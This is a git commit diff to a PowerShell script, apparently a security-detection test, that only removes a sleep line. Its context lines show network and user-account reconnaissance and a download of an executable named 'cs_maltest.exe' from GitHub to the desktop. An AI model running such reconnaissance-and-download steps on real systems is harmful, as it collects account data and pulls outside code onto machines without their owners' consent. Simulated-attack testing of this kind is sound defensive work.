b7cc770af1221dc1c950609371c7e36eb5eed037
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-06-25 14:26:49 +0900

    Update cs-test.ps1

--- cs-test.ps1
+++ cs-test.ps1
@@ -4,4 +4,4 @@ arp -a | Out-Null
 wmic useraccount get /ALL | Out-Null
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 (New-Object System.Net.WebClient).DownloadFile('https://github.com/macigaiga/cstest/raw/master/cs_maltest.exe', "$env:USERPROFILE"+'/Desktop/cs_maltest.exe')
-Start-Sleep -s 10
+
